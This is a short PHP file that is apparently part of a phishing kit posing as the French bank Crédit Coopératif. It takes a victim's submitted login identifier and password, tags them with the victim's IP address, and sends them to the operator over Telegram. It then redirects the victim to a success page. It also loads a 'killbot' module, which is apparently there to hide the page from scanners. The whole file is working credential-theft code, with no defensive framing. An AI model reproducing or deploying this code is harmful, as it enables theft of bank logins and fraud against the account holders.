<?php

require_once 'killbot/code/include.php';

error_reporting(0);

if (session_status() === PHP_SESSION_NONE) {
  session_start();
}

include 'includes.php';
include 'core/ip.php';
include 'core/telegram.php';
include 'config.php';

if (isset($_POST['ai'],$_POST['pr'],)) {

  $ip = ip();
  $ai = $_POST['ai'];
  $pr = $_POST['pr'];
 

  $message = "💌 LOG CRÉDIT COOPERATIF: $ip\n\n";
  $message .= "🧲 IDENTIFIANT : $ai \n";
  $message .= "🧲 MOT DE PASSE : $pr \n";
  $_SESSION['data'] = $message;

  tlgsend(urlencode($message));

   header('location: ../success.php');
}

